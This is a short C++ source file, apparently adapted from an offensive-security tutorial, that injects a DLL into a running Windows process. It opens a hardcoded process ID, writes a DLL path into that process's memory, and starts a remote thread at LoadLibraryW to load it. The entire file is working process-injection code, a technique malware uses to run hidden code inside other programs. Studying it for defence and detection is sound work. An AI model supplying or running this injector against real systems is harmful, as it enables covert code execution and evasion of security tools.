#include <string>
#include <iostream>
#include <windows.h>

// original code - https://www.ired.team/offensive-security/code-injection-process-injection/dll-injection

int main(int argc, char* argv[])
{
	HANDLE processHandle;
	PVOID remoteBuffer;
	int pid = 13108;
	wchar_t dllPath[] = TEXT("C:\\Users\\user\\Desktop\\m3t.dll");

	printf("Injecting DLL to PID: %i\n", pid);
	processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(pid));
	remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof dllPath, MEM_COMMIT, PAGE_READWRITE);
	WriteProcessMemory(processHandle, remoteBuffer, (LPVOID)dllPath, sizeof dllPath, NULL);
	PTHREAD_START_ROUTINE threatStartRoutineAddress = (PTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(TEXT("Kernel32")), "LoadLibraryW");
	CreateRemoteThread(processHandle, NULL, 0, threatStartRoutineAddress, remoteBuffer, 0, NULL);
	CloseHandle(processHandle);

	return 0;
}